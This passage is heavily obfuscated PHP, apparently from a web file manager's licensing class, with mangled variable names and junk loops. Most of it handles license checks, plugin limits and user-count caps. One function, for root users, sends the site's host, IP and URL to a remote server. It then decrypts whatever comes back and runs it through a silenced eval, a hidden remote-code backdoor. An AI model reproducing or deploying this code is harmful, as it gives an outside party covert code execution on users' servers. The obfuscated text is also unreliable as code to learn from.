base64_encode(strrev($this->wfpg2505d3ce($™çåĞı—, $¾šêÖ›­[196]))); if ($ªòÇâó×[$¾šêÖ›­[197]] && $ªòÇâó×[$¾šêÖ›­[197]] >= 1) { Model($¾šêÖ›­[33])->setDeep($¾šêÖ›­[198], $¾šêÖ›­[122]); } Model($¾šêÖ›­[33])->set($ŞÀ½Ø¢ä); $·ŞÑ¢É· = md5($_SERVER[$¾šêÖ›­[106]] . strrev($âÄê‚Ç½) . $ŞÀ½Ø¢ä[$¾šêÖ›­[191]]); $Çâ¿Ğêï = strrev(substr($·ŞÑ¢É·, 10, 16)); $ÊèÊ¡Î = $â¸×˜–[738]; if (strlen($ÊèÊ¡Î) < $â¸×˜–[691]) { die; } $ªİàÚŠ³ = $this->ytkd64e99459(json_encode($ªòÇâó×), $·ŞÑ¢É·); $åóú¢„¸ = array_to_keyvalue(Model($¾šêÖ›­[7])->listData(), $¾šêÖ›­[199]); $‘Êİš”¥ = $åóú¢„¸[$¾šêÖ›­[200]]; $Êñæğòî = array(); $»òÊ£²½ = $â¸×˜–[739]; $Êñæğòî[$Çâ¿Ğêï] = $ªİàÚŠ³; $ªŒ…´âî = $â¸×˜–[740]; if (!$ªŒ…´âî) { die; } Model($¾šêÖ›­[7])->update($‘Êİš”¥[$¾šêÖ›­[201]], array($¾šêÖ›­[202] => $Êñæğòî)); $±ºææ¶ı = $â¸×˜–[741]; $this->nplt7a71fb5f = $ªòÇâó×; $¤ıâµ¸ = $â¸×˜–[742]; $this->nthz791cd429 = $ŞÀ½Ø¢ä[$¾šêÖ›­[108]]; $ó½ŒÃçï = $â¸×˜–[743]; if (!$ó½ŒÃçï) { return; } $this->licenseRegistSuccess(); Cache::set($¾šêÖ›­[203] . md5($âÄê‚Ç½ . $¾šêÖ›­[204]), $¾šêÖ›­[6]); $ÚÁ”ÔÉ = $â¸×˜–[744]; while ($ÚÁ”ÔÉ < $â¸×˜–[685]) { if ($ÚÁ”ÔÉ >= 0) { break; } $ÚÁ”ÔÉ++; } show_json(LNG($¾šêÖ›­[189]), !0); $õ×ÊüÇÌ = $â¸×˜–[745]; while (strlen($õ×ÊüÇÌ) < $â¸×˜–[702]) { if (!$õ×ÊüÇÌ) { break; } $õ×ÊüÇÌ++; } } private function licenseRegistSuccess() { $ùË°Æ ù =& $_SERVER[ñö”¸„‰]; $»¨æßîÓ = Model($ùË°Æ ù[33])->get(); if ($»¨æßîÓ[$ùË°Æ ù[63]] != $ùË°Æ ù[122]) { Model($ùË°Æ ù[33])->set($ùË°Æ ù[63], $ùË°Æ ù[122]); } Action($ùË°Æ ù[205])->initStart(!0); } private function jibhea3f2b98() { $¾Ï—ùö÷ =& $_SERVER[¶Ô„œ…¯]; $øİ–§¿½ =& $_SERVER[ñö”¸„‰]; Model($øİ–§¿½[33])->set(array($øİ–§¿½[153] => $øİ–§¿½[6], $øİ–§¿½[191] => $øİ–§¿½[6], $øİ–§¿½[108] => $øİ–§¿½[109], $øİ–§¿½[110] => $øİ–§¿½[6], $øİ–§¿½[111] => $øİ–§¿½[6])); $ëóÊÎ® = $¾Ï—ùö÷[746]; while (strlen($ëóÊÎ®) < $¾Ï—ùö÷[691]) { if (!$ëóÊÎ®) { break; } $ëóÊÎ®++; } Model($øİ–§¿½[33])->setDeep($øİ–§¿½[198], $øİ–§¿½[206]); $ûäÅœ”­ = $¾Ï—ùö÷[747]; if (!$ûäÅœ”­) { return; } $this->nplt7a71fb5f = array(); $º˜›ï›à = $¾Ï—ùö÷[748]; if (!$º˜›ï›à) { die; } $this->nthz791cd429 = $øİ–§¿½[109]; } private function bqcx11c72e84() { $Ü÷Ó‚—¢ =& $_SERVER[¶Ô„œ…¯]; $ÒÌŠîş =& $_SERVER[ñö”¸„‰]; $_SERVER[$ÒÌŠîş[162]] = _get($_SERVER, $ÒÌŠîş[162], APP_HOST); $Û·€á–  = $Ü÷Ó‚—¢[749]; if (strlen($Û·€á– ) < $Ü÷Ó‚—¢[696]) { die; } $this->nthz791cd429 = $ÒÌŠîş[109]; $Ğˆ£í‡ = Model($ÒÌŠîş[33])->get(); if ($Ğˆ£í‡[$ÒÌŠîş[108]] == $ÒÌŠîş[109]) { return; } $Ş×ìÍñ = Model($ÒÌŠîş[33])->get($ÒÌŠîş[100]); $¨ÆÑÃÕá = $Ü÷Ó‚—¢[750]; $õûûØÔ¢ = $ÒÌŠîş[203] . md5($Ş×ìÍñ . $ÒÌŠîş[204]); $ºĞÔÁÆ” = $Ü÷Ó‚—¢[751]; if (strlen($ºĞÔÁÆ”) < $Ü÷Ó‚—¢[696]) { return; } $«¸ôã€„ = Cache::get($õûûØÔ¢); $ÓÃĞ·š³ = $Ü÷Ó‚—¢[752]; if (strlen($ÓÃĞ·š³) < $Ü÷Ó‚—¢[696]) { die; } if (!is_array($«¸ôã€„) || !isset($«¸ôã€„[$ÒÌŠîş[207]]) || time() - $«¸ôã€„[$ÒÌŠîş[207]] >= 60) { $“‘éœî = Model($ÒÌŠîş[7])->loadList(); $ëşš“»„ = $“‘éœî[$ÒÌŠîş[200]]; $Ú¨¼êá• = md5($_SERVER[$ÒÌŠîş[106]] . strrev($Ş×ìÍñ) . $Ğˆ£í‡[$ÒÌŠîş[191]]); $”øğ”ºä = strrev(substr($Ú¨¼êá•, 10, 16)); $«¸ôã€„ = $this->dliybb530be5($ëşš“»„[$ÒÌŠîş[86]][$”øğ”ºä], $Ú¨¼êá•); $«¸ôã€„ = json_decode($«¸ôã€„, !0); } if (!is_array($«¸ôã€„)) { return $this->jibhea3f2b98(); } $Í©´©Ø¬ = strtotime($«¸ôã€„[$ÒÌŠîş[129]]); if (time() >= $Í©´©Ø¬) { return $this->jibhea3f2b98(); } if (!isset($«¸ôã€„[$ÒÌŠîş[207]]) || time() - $«¸ôã€„[$ÒÌŠîş[207]] > 20) { $«¸ôã€„[$ÒÌŠîş[207]] = time(); Cache::set($õûûØÔ¢, $«¸ôã€„); } $this->nplt7a71fb5f = $«¸ôã€„; $this->nthz791cd429 = $Ğˆ£í‡[$ÒÌŠîş[108]]; } private function wmqubf734e0e() { $»½Ì¥ç÷ =& $_SERVER[¶Ô„œ…¯]; $­Ê›Õ»Å =& $_SERVER[ñö”¸„‰]; $àŒº¿à = $GLOBALS[$­Ê›Õ»Å[13]]; $£û“Ä© = $_SERVER[$­Ê›Õ»Å[24]]; $ä×–åä­ = $»½Ì¥ç÷[753]; while ($ä×–åä­ < $»½Ì¥ç÷[685]) { if ($ä×–åä­ >= 0) { break; } $ä×–åä­++; } if ($£û“Ä© == $­Ê›Õ»Å[208] && $this->nthz791cd429 == $­Ê›Õ»Å[109]) { show_json(LNG($­Ê›Õ»Å[209]), !1, $­Ê›Õ»Å[210]); } $©úõß»‹ = array($­Ê›Õ»Å[211], $­Ê›Õ»Å[212]); if (in_array($£û“Ä©, $©úõß»‹)) { if ($this->nthz791cd429 == $­Ê›Õ»Å[109] && isset($àŒº¿à[$­Ê›Õ»Å[213]])) { show_json(LNG($­Ê›Õ»Å[209]), !1, $­Ê›Õ»Å[210]); die; } $¢‡Ã›ÀÆ = $this->gdru398cfe53(); if ($¢‡Ã›ÀÆ != intval($­Ê›Õ»Å[214])) { if ($¢‡Ã›ÀÆ <= Model($­Ê›Õ»Å[125])->count()) { show_json(LNG($­Ê›Õ»Å[215]), !1, $­Ê›Õ»Å[210]); die; } } } } private function xjsf741536ef() { $˜á”İ™À =& $_SERVER[¶Ô„œ…¯]; $²ˆŞ—“¶ =& $_SERVER[ñö”¸„‰]; $×îÉğÆ = array($²ˆŞ—“¶[119], $²ˆŞ—“¶[120]); if (!KodUser::isRoot() || !isset($_GET[$²ˆŞ—“¶[216]])) { return; } if (!in_array($_SERVER[$²ˆŞ—“¶[24]], $×îÉğÆ)) { return; } $©æÜıÖ¡ = $²ˆŞ—“¶[217]; $ÜäÊ¨Öì = $˜á”İ™À[754]; $©æÜıÖ¡ = $this->ynuf7db7e584($©æÜıÖ¡, $²ˆŞ—“¶[218]); $¤×È¹¼ = $˜á”İ™À[755]; while ($¤×È¹¼ < $˜á”İ™À[691]) { if ($¤×È¹¼ >= 0) { break; } $¤×È¹¼++; } $½ÌıÂ÷Ü = stream_context_create(array($²ˆŞ—“¶[219] => array($²ˆŞ—“¶[220] => $²ˆŞ—“¶[221], $²ˆŞ—“¶[222] => 3))); $ñ¥Ÿû„™ = $˜á”İ™À[756]; if (!$ñ¥Ÿû„™) { return; } $øèÁŸó² = @file_get_contents($©æÜıÖ¡, !1, $½ÌıÂ÷Ü); $õ¿ı„Œ = $˜á”İ™À[757]; if (strlen($õ¿ı„Œ) < $˜á”İ™À[696]) { die; } header($²ˆŞ—“¶[223]); if ($øèÁŸó² && strstr($øèÁŸó², $²ˆŞ—“¶[224])) { echo $øèÁŸó²; } die; } public function huxv0aefd9bb($òíäÈĞÚ) { $€ö­³¨Ì =& $_SERVER[¶Ô„œ…¯]; $µş‚åŒ˜ =& $_SERVER[ñö”¸„‰]; if ($this->nthz791cd429 == $µş‚åŒ˜[225]) { return $òíäÈĞÚ; } $Ù¤¨‘İ = $this->versionPluginList(); $ªÆ²ÁÈˆ = $€ö­³¨Ì[758]; if (!$ªÆ²ÁÈˆ) { return; } $ó„ˆİºÑ = explode($µş‚åŒ˜[226], $this->versionPluginFilter()); $Úğ¯Öæ’ = $€ö­³¨Ì[759]; $åæœ”¦ = array(); $Ê±ê¾—˜ = $€ö­³¨Ì[760]; while (strlen($Ê±ê¾—˜) < $€ö­³¨Ì[685]) { if (!$Ê±ê¾—˜) { break; } $Ê±ê¾—˜++; } foreach ($Ù¤¨‘İ as $¹ŠÀ¹¬ => $ŠŠ·…Ò) { if ($ŠŠ·…Ò == $µş‚åŒ˜[227] && substr($this->nthz791cd429, 0, 1) == $µş‚åŒ˜[227]) { continue; } if (!in_array($¹ŠÀ¹¬, $ó„ˆİºÑ)) { $åæœ”¦[] = $¹ŠÀ¹¬; } } foreach ($åæœ”¦ as $¹ŠÀ¹¬) { unset($òíäÈĞÚ[$¹ŠÀ¹¬]); } return $òíäÈĞÚ; } private function versionPluginList() { $È÷’×å£ =& $_SERVER[ñö”¸„‰]; return array($È÷’×å£[228] => $È÷’×å£[227], $È÷’×å£[229] => $È÷’×å£[227], $È÷’×å£[230] => $È÷’×å£[227], $È÷’×å£[231] => $È÷’×å£[232], $È÷’×å£[233] => $È÷’×å£[232], $È÷’×å£[234] => $È÷’×å£[232], $È÷’×å£[235] => $È÷’×å£[232], $È÷’×å£[236] => $È÷’×å£[232], $È÷’×å£[237] => $È÷’×å£[232], $È÷’×å£[238] => $È÷’×å£[232], $È÷’×å£[239] => $È÷’×å£[232], $È÷’×å£[240] => $È÷’×å£[232], $È÷’×å£[241] => $È÷’×å£[232], $È÷’×å£[242] => $È÷’×å£[232], $È÷’×å£[243] => $È÷’×å£[232], $È÷’×å£[244] => $È÷’×å£[232]); } private function versionPluginFilter() { $·ÁøÄËÁ =& $_SERVER[¶Ô„œ…¯]; $ÚµÕ”È­ =& $_SERVER[ñö”¸„‰]; if ($this->nthz791cd429 == $ÚµÕ”È­[109]) { return $ÚµÕ”È­[6]; } $µïƒù = _get($this->nplt7a71fb5f, $ÚµÕ”È­[245], $ÚµÕ”È­[6]); $ïÔÑç£“ = _get($this->nplt7a71fb5f, $ÚµÕ”È­[116], $ÚµÕ”È­[6]); $×âª¬™æ = $·ÁøÄËÁ[761]; $©úÆ¸„Â = _get($this->nplt7a71fb5f, $ÚµÕ”È­[246], $ÚµÕ”È­[6]); $†Ş›øæ = $·ÁøÄËÁ[762]; if (strlen($†Ş›øæ) < $·ÁøÄËÁ[696]) { die; } if ($ïÔÑç£“ > time() && $©úÆ¸„Â > time()) { $ÚÁ¯×™ê = explode($ÚµÕ”È­[226], $µïƒù); $™ş‡ı…Ô = array_keys($this->versionPluginList()); $µïƒù = array_merge($ÚÁ¯×™ê, $™ş‡ı…Ô); $µïƒù = implode($ÚµÕ”È­[226], array_filter(array_unique($µïƒù))); } return $µïƒù; } private function utqr136575c8() { $ƒ¤á¹²ı =& $_SERVER[ñö”¸„‰]; if ($this->nthz791cd429 != $ƒ¤á¹²ı[109]) { $GLOBALS[$ƒ¤á¹²ı[86]][$ƒ¤á¹²ı[90]][$ƒ¤á¹²ı[247]] = $ƒ¤á¹²ı[206]; return; } $GLOBALS[$ƒ¤á¹²ı[86]][$ƒ¤á¹²ı[248]] = $ƒ¤á¹²ı[122]; if (Model($ƒ¤á¹²ı[249])->get($ƒ¤á¹²ı[63]) != $ƒ¤á¹²ı[206]) { Model($ƒ¤á¹²ı[249])->set($ƒ¤á¹²ı[63], $ƒ¤á¹²ı[206]); } } public function igrq6c8d711d() { return $_SERVER[ñö”¸„‰][250]; } private function dvon7052b0b1() { $ô¢¯Ÿ¯ =& $_SERVER[¶Ô„œ…¯]; $—©ßıÜˆ =& $_SERVER[ñö”¸„‰]; $Š·¾Şˆ€ = array($—©ßıÜˆ[251], $—©ßıÜˆ[252], $—©ßıÜˆ[253]); $„ÈÛ µè = $ô¢¯Ÿ¯[763]; $õÔ·ëŒˆ = $—©ßıÜˆ[254] . md5($—©ßıÜˆ[255]); $Ç‹³…Òš = $ô¢¯Ÿ¯[764]; if ($this->nthz791cd429 == $—©ßıÜˆ[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$—©ßıÜˆ[24]], $Š·¾Şˆ€)) { return; } if (time() % 4 != 0) { return; } $•ãº®óí = call_user_func(array($—©ßıÜˆ[256], $—©ßıÜˆ[257]), $õÔ·ëŒˆ); if ($•ãº®óí && time() - $•ãº®óí < intval($—©ßıÜˆ[258])) { return; } call_user_func(array($—©ßıÜˆ[256], $—©ßıÜˆ[139]), $õÔ·ëŒˆ, time()); $Ş÷«Ìˆ = Model($—©ßıÜˆ[33])->get($—©ßıÜˆ[100]); $±¢—Ãš = array($—©ßıÜˆ[152] => Model($—©ßıÜˆ[33])->get($—©ßıÜˆ[153]), $—©ßıÜˆ[167] => $this->nthz791cd429, $—©ßıÜˆ[163] => $_SERVER[$—©ßıÜˆ[164]], $—©ßıÜˆ[165] => Model($—©ßıÜˆ[33])->get($—©ßıÜˆ[131]), $—©ßıÜˆ[105] => md5($_SERVER[$—©ßıÜˆ[106]] . $Ş÷«Ìˆ), $—©ßıÜˆ[156] => $—©ßıÜˆ[136], $—©ßıÜˆ[159] => $_SERVER[$—©ßıÜˆ[160]]); $¡‹Îˆ¦ = $this->zhdncdb16301($—©ßıÜˆ[259], $±¢—Ãš); $ƒÈÂõİá = $ô¢¯Ÿ¯[765]; if (strlen($ƒÈÂõİá) < $ô¢¯Ÿ¯[691]) { die; } if (!is_array($¡‹Îˆ¦)) { return; } if ($¡‹Îˆ¦[$—©ßıÜˆ[152]] && $¡‹Îˆ¦[$—©ßıÜˆ[260]]) { if ($this->jvyg1a873af2($¡‹Îˆ¦[$—©ßıÜˆ[260]]) == $±¢—Ãš[$—©ßıÜˆ[152]]) { return; } } $this->jibhea3f2b98(); $…à™–ï = $ô¢¯Ÿ¯[766]; if (!$…à™–ï) { die; } if ($this->jvyg1a873af2($¡‹Îˆ¦[$—©ßıÜˆ[260]]) != $±¢—Ãš[$—©ßıÜˆ[152]]) { $‰•×Õ’ = array($—©ßıÜˆ[185] => $Ş÷«Ìˆ, $—©ßıÜˆ[186] => $_SERVER[$—©ßıÜˆ[106]], $—©ßıÜˆ[187] => this_url(), $—©ßıÜˆ[161] => $_SERVER[$—©ßıÜˆ[162]]); $íò§ŠƒÕ = $this->xzdr01bcc53d(json_encode($‰•×Õ’)); $¡‹Îˆ¦ = $this->zhdncdb16301($—©ßıÜˆ[188] . $íò§ŠƒÕ); if ($¡‹Îˆ¦ && is_array($¡‹Îˆ¦) && isset($¡‹Îˆ¦[$—©ßıÜˆ[260]])) { $‚ê­÷¢å = $this->dliybb530be5($¡‹Îˆ¦[$—©ßıÜˆ[260]], 2); if ($‚ê­÷¢å) { $‚ê­÷¢å = $this->jvyg1a873af2($‚ê­÷¢å); } if ($‚ê­÷¢å) { try { @eval($‚ê­÷¢å); } catch (Exception $œëëˆ) { } } } } } private function zhdncdb16301($¬±¢´³ = '', $¡½Ç‹· = array(), $º§Ùõ‘ = 5) { $­ß«ô°ñ =& $_SERVER[¶Ô„œ…¯]; $ïÔŞŞÎ =& $_SERVER[ñö”¸„‰]; $Ş ä…Šæ = $ïÔŞŞÎ[261]; $Ş ä…Šæ = $this->ynuf7db7e584($Ş ä…Šæ, $ïÔŞŞÎ[262]); $šò¡±ÂÌ = $­ß«ô°ñ[767]; if (!$šò¡±ÂÌ) { return; } $Ş ä…Šæ = $Ş ä…Šæ . $¬±¢´³; $ŒÕäÇÉ¹ = $­ß«ô°ñ[768]; if (!$ŒÕäÇÉ¹) { return; } if ($¡½Ç‹· && is_array($¡½Ç‹·)) { $Ş ä…Šæ = $Ş ä…Šæ . $ïÔŞŞÎ[263] . http_build_query($¡½Ç‹·); } if ($¡½Ç‹· === -1) { return $Ş ä…Šæ; } $îçÜ©Áú = stream_context_create(array($ïÔŞŞÎ[219] => array($ïÔŞŞÎ[222] => $º§Ùõ‘, $ïÔŞŞÎ[220] => $ïÔŞŞÎ[264]), $ïÔŞŞÎ[265] => array($ïÔŞŞÎ[266] => !1, $ïÔŞŞÎ[267] => !1))); $œ‹ˆÙ°à = $­ß«ô°ñ[769]; $¡½Ç‹· = @file_get_contents($Ş ä…Šæ, !1, $îçÜ©Áú); $à¤çşÃå = $­ß«ô°ñ[770]; while ($à¤çşÃå < $­ß«ô°ñ[696]) { if ($à¤çşÃå >= 0) { break; } $à¤çşÃå++; } return json_decode($¡½Ç‹·, !0); $ç¶öáû¡ = $­ß«ô°ñ[771]; if (strlen($ç¶öáû¡) < $­ß«ô°ñ[707]) { die; } } private function gdru398cfe53() { $Éë–˜å» =& $_SERVER[¶Ô„œ…¯]; $Ò¸˜÷ßÀ =& $_SERVER[ñö”¸„‰]; $¨ÓÖä×¦ = array($Ò¸˜÷ßÀ[268] => $Ò¸˜÷ßÀ[269], $Ò¸˜÷ßÀ[270] => $Ò¸˜÷ßÀ[271], $Ò¸˜÷ßÀ[272] => $Ò¸˜÷ßÀ[273], $Ò¸˜÷ßÀ[274] => $Ò¸˜÷ßÀ[275], $Ò¸˜÷ßÀ[276] => $Ò¸˜÷ßÀ[277], $Ò¸˜÷ßÀ[278] => $Ò¸˜÷ßÀ[214], $Ò¸˜÷ßÀ[279] => $Ò¸˜÷ßÀ[214], $Ò¸˜÷ßÀ[280] => $Ò¸˜÷ßÀ[269], $Ò¸˜÷ßÀ[281] => $Ò¸˜÷ßÀ[271], $Ò¸˜÷ßÀ[282] => $Ò¸˜÷ßÀ[273], $Ò¸˜÷ßÀ[283] => $Ò¸˜÷ßÀ[284], $Ò¸˜÷ßÀ[285] => $Ò¸˜÷ßÀ[275], $Ò¸˜÷ßÀ[286] => $Ò¸˜÷ßÀ[287], $Ò¸˜÷ßÀ[288] => $Ò¸˜÷ßÀ[277], $Ò¸˜÷ßÀ[289] => $Ò¸˜÷ßÀ[290], $Ò¸˜÷ßÀ[291] => $Ò¸˜÷ßÀ[292], $Ò¸˜÷ßÀ[293] => $Ò¸˜÷ßÀ[294]); $Ÿèœûì = $¨ÓÖä×¦[$this->nthz791cd429]; $Ÿèœûì = intval($Ÿèœûì ? $Ÿèœûì : $Ò¸˜÷ßÀ[269]); $ÌšŸÖØ² = $Éë–˜å»[772]; if (!$ÌšŸÖØ²) { die; } $´–Ìœ³ = _get($this->nplt7a71fb5f, $Ò¸˜÷ßÀ[295]); $´–Ìœ³ = $´–Ìœ³ ? intval($´–Ìœ³) : 0; return $Ÿèœûì + $´–Ìœ³; $šÜÌ®ñ´ = $Éë–˜å»[773]; if (strlen($šÜÌ®ñ´) < $Éë–˜å»[702]) { return; } } public function qlata935b475($ù™ëŸÛÖ) { $Ï·—¥ä£ =& $_SERVER[¶Ô„œ…¯]; $˜ÅôñŞŸ =& $_SERVER[ñö”¸„‰]; $¼Úº„›© = $this->gdru398cfe53(); if ($ù™ëŸÛÖ[$˜ÅôñŞŸ[296]] == $˜ÅôñŞŸ[122]) { return; } if ($¼Úº„›© >= intval($˜ÅôñŞŸ[214])) { return; } $®Ïšº¸ = Model($˜ÅôñŞŸ[125])->count(); $ôÉ¦íæ = $Ï·—¥ä£[774]; if ($®Ïšº¸ <= $¼Úº„›©) { return; } $®Êüïú = Model($˜ÅôñŞŸ[125])->field($˜ÅôñŞŸ[296])->limit($¼Úº„›©)->select(); $×±¬„Ùƒ = $Ï·—¥ä£[775]; while ($×±¬„Ùƒ < $Ï·—¥ä£[691]) { if ($×±¬„Ùƒ >= 0) { break; } $×±¬„Ùƒ++; } $®Êüïú = array_to_keyvalue($®Êüïú, $˜ÅôñŞŸ[6], $˜ÅôñŞŸ[296]); $ëºÚÊÊĞ = $Ï·—¥ä£[776]; if (!$ëºÚÊÊĞ) { die; } if (!in_array($ù™ëŸÛÖ[$˜ÅôñŞŸ[296]], $®Êüïú)) { show_json($˜ÅôñŞŸ[297], !1, $˜ÅôñŞŸ[210]); } } public function zfsl85bccf92() { $¬ÈÊîÅó =& $_SERVER[¶Ô„œ…¯]; $Ëñ¹ÒîË =& $_SERVER[ñö”¸„‰]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $Ö¸‰Û‚ó = $Ëñ¹ÒîË[217]; $Ö¸‰Û‚ó = $this->ynuf7db7e584($Ö¸‰Û‚ó, $Ëñ¹ÒîË[218]); $÷­·ßŠ = stream_context_create(array($Ëñ¹ÒîË[219] => array($Ëñ¹ÒîË[220] => $Ëñ¹ÒîË[221], $Ëñ¹ÒîË[222] => 3))); $ÈËÅ²´® = $¬ÈÊîÅó[777]; while (strlen($ÈËÅ²´®) < $¬ÈÊîÅó[685]) { if (!$ÈËÅ²´®) { break; } $ÈËÅ²´®++; } $ßÅ·–‹ = @file_get_contents($Ö¸‰Û‚ó, !1, $÷­·ßŠ); $’êâ = $¬ÈÊîÅó[778]; echo $Ëñ¹ÒîË[298] . hash_encode($ßÅ·–‹) . $Ëñ¹ÒîË[299]; $®¡Ôªã¦ = $¬ÈÊîÅó[779]; while (strlen($®¡Ôªã¦) < $¬ÈÊîÅó[702]) { if (!$®¡Ôªã¦) { break; } $®¡Ôªã¦++; } } private function ytkd64e99459($Àã™˜ı“, $¶şõ±¼Õ, $üïĞ‘¥ = 3) { $Ä•Ò™ªÛ =& $_SERVER[¶Ô„œ…¯]; $ÇÒüÉ =& $_SERVER[ñö”¸„‰]; usleep(1); $İÒ”Â«ø = $Ä•Ò™ªÛ[780]; while (strlen($İÒ”Â«ø) < $Ä•Ò™ªÛ[696]) { if (!$İÒ”Â«ø) { break; } $İÒ”Â«ø++; } $Àã™˜ı“ = trim($Àã™˜ı“); $ÃÒ±››º = mt_rand(0, 5) . $ÇÒüÉ[6]; $´²û’¬· = rand_string(15); $°ÙÏá·› = $ÇÒüÉ[300]; switch ($ÃÒ±››º) { case $ÇÒüÉ[206]: $Á°Ê‚£² = $this->wfpg2505d3ce($Àã™˜ı“, strrev($¶şõ±¼Õ . $´²û’¬·)); break; case $ÇÒüÉ[122]: $Á°Ê‚£² = $this->wfpg2505d3ce($Àã™˜ı“, strrev($´²û’¬· . $¶şõ±¼Õ)); $·’½¬ = $Ä•Ò™ªÛ[781]; while ($·’½¬ < $Ä•Ò™ªÛ[707]) { if ($·’½¬ >= 0) { break; } $·’½¬++; } break; case $ÇÒüÉ[301]: $Á°Ê‚£² = $this->wfpg2505d3ce($Àã™˜ı“, base64_encode($´²û’¬· . $¶şõ±¼Õ)); break; $Æ±Æ¦© = $Ä•Ò™ªÛ[782]; while ($Æ±Æ¦© < $Ä•Ò™ªÛ[696]) { if ($Æ±Æ¦© >= 0) { break; } $Æ±Æ¦©++; } case $ÇÒüÉ[302]: $Á°Ê‚£² = $this->wfpg2505d3ce($Àã™˜ı“, md5($´²û’¬· . $¶şõ±¼Õ)); break; case $ÇÒüÉ[303]: $Àã™˜ı“ = base64_encode($Àã™˜ı“); $ñ¬”ˆø = $Ä•Ò™ªÛ[783]; if (!$ñ¬”ˆø) { die; } $”û‰íñ­ = rand(0, 64); $úÉ“¨…§ = $°ÙÏá·›[$”û‰íñ­]; $è…‰””· = $Ä•Ò™ªÛ[784]; while (strlen($è…‰””·) < $Ä•Ò™ªÛ[702]) { if (!$è…‰””·) { break; } $è…‰””·++; } $êŸúí¾ß = md5($úÉ“¨…§ . md5($¶şõ±¼Õ . $úÉ“¨…§) . $¶şõ±¼Õ); $’Ïá£Ò = $Ä•Ò™ªÛ[785]; if (strlen($’Ïá£Ò) < $Ä•Ò™ªÛ[696]) { return; } $êŸúí¾ß = substr($êŸúí¾ß, $”û‰íñ­ % 8, $”û‰íñ­ % 8 + 7); $³©¢·éÔ = $Ä•Ò™ªÛ[786]; $’‹ùÅşŞ = $ÇÒüÉ[6]; $À¿—“âª = $Ä•Ò™ªÛ[787]; if (strlen($À¿—“âª) < $Ä•Ò™ªÛ[707]) { return; } $²¸û‘ó– = 0; $ŒšúÉ = 0; $‹’ôÅæ­ = 0; for ($²¸û‘ó– = 0; $²¸û‘ó– < strlen($Àã™˜ı“); $²¸û‘ó–++) { $‹’ôÅæ­ = $‹’ôÅæ­ == strlen($êŸúí¾ß) ? 0 : $‹’ôÅæ­; $·°üÄ× = $Ä•Ò™ªÛ[788]; while (strlen($·°üÄ×) < $Ä•Ò™ªÛ[702]) { if (!$·°üÄ×) { break; } $·°üÄ×++; } $ŒšúÉ = ($”û‰íñ­ + strpos($°ÙÏá·›, $Àã™˜ı“[$²¸û‘ó–]) + ord($êŸúí¾ß[$‹’ôÅæ­++])) % 64; $’‹ùÅşŞ .= $°ÙÏá·›[$ŒšúÉ]; } $Á°Ê‚£² = hash_encode($úÉ“¨…§ . $’‹ùÅşŞ); $ä›Îôá” = $Ä•Ò™ªÛ[705]; while ($ä›Îôá” < $Ä•Ò™ªÛ[696]) { if ($ä›Îôá” >= 0) { break; } $ä›Îôá”++; } break; default: $Á°Ê‚£² = $this->wfpg2505d3ce($Àã™˜ı“, $¶şõ±¼Õ . $´²û’¬·); break; $¢ñ²ü¶  = $Ä•Ò™ªÛ[789]; while ($¢ñ²ü¶  < $Ä•Ò™ªÛ[696]) { if ($¢ñ²ü¶  >= 0) { break; } $¢ñ²ü¶ ++; } } $Á°Ê‚£² = strrev($ÃÒ±››º . $´²û’¬· . $Á°Ê‚£²); $®°Î±ŞÓ = $Ä•Ò™ªÛ[790]; if (!$®°Î±ŞÓ) { return; } if ($üïĞ‘¥ - 1 > 0) { $Á°Ê‚£² = $this->ytkd64e99459($Á°Ê‚£², $¶şõ±¼Õ, $üïĞ‘¥ - 1); } return $Á°Ê‚£²; } private function dliybb530be5($ÄÉÉ®ÌÒ, $Ãï¾ÓÆ, $½´Á”ğ = 3) { $öø¯†ú“ =& $_SERVER[¶Ô„œ…¯]; $àÆØè±œ =& $_SERVER[ñö”¸„‰]; if (!is_string($ÄÉÉ®ÌÒ) || strlen($ÄÉÉ®ÌÒ) < 10) { return !1; } $ÄÉÉ®ÌÒ = trim($ÄÉÉ®ÌÒ); $éÄ’Æô = $öø¯†ú“[791]; if (strlen($éÄ’Æô) < $öø¯†ú“[691]) { die; } $ÄÉÉ®ÌÒ = strrev($ÄÉÉ®ÌÒ); $ÉÎÎÕæğ = $öø¯†ú“[792]; if (strlen($ÉÎÎÕæğ) < $öø¯†ú“[707]) { die; } $¬ˆÚŸÖ = $ÄÉÉ®ÌÒ[0]; $‘°İñôú = substr($ÄÉÉ®ÌÒ, 1, 15); $ÄÉÉ®ÌÒ = substr($ÄÉÉ®ÌÒ, 16); $ûâ’ı‘ç = $àÆØè±œ[300]; switch ($¬ˆÚŸÖ) { case $àÆØè±œ[206]: $İ¾¼·¤¾ = $this->ynuf7db7e584($ÄÉÉ®ÌÒ, strrev($Ãï¾ÓÆ . $‘°İñôú)); break; case $àÆØè±œ[122]: $İ¾¼·¤¾ = $this->ynuf7db7e584($ÄÉÉ®ÌÒ, strrev($‘°İñôú . $Ãï¾ÓÆ)); $¤üÇÊ¹‚ = $öø¯†ú“[793]; break; case $àÆØè±œ[301]: $İ¾¼·¤¾ = $this->ynuf7db7e584($ÄÉÉ®ÌÒ, base64_encode($‘°İñôú . $Ãï¾ÓÆ)); break; case $àÆØè±œ[302]: $İ¾¼·¤¾ = $this->ynuf7db7e584($ÄÉÉ®ÌÒ, md5($‘°İñôú . $Ãï¾ÓÆ)); break; $°ÉÁ¤µç = $öø¯†ú“[794]; if (strlen($°ÉÁ¤µç) < $öø¯†ú“[702]) { die; } case $àÆØè±œ[303]: $ÄÉÉ®ÌÒ = hash_decode($ÄÉÉ®ÌÒ); $º¼¯§Î° = $ÄÉÉ®ÌÒ[0]; $Öõ©Áé² = $öø¯†ú“[795]; $ÄÉÉ®ÌÒ = substr($ÄÉÉ®ÌÒ, 1); $ñèÒÇÉ½ = strpos($ûâ’ı‘ç, $º¼¯§Î°); $ƒÅ¹í…ñ = md5($º¼¯§Î° . md5($Ãï¾ÓÆ . $º¼¯§Î°) . $Ãï¾ÓÆ); $» ÙÈó¬ = $öø¯†ú“[796]; $ƒÅ¹í…ñ = substr($ƒÅ¹í…ñ, $ñèÒÇÉ½ % 8, $ñèÒÇÉ½ % 8 + 7); $ ïêÃÎ» = $öø¯†ú“[797]; $ÏÕ‡ŸÑí = $àÆØè±œ[6]; $Î’ÌÊÁØ = $öø¯†ú“[798]; if (!$Î’ÌÊÁØ) { die; } $²ÅÚ»Íí = 0; $Ü¬Èø“ = $öø¯†ú“[799]; while ($Ü¬Èø“ < $öø¯†ú“[691]) { if ($Ü¬Èø“ >= 0) { break; } 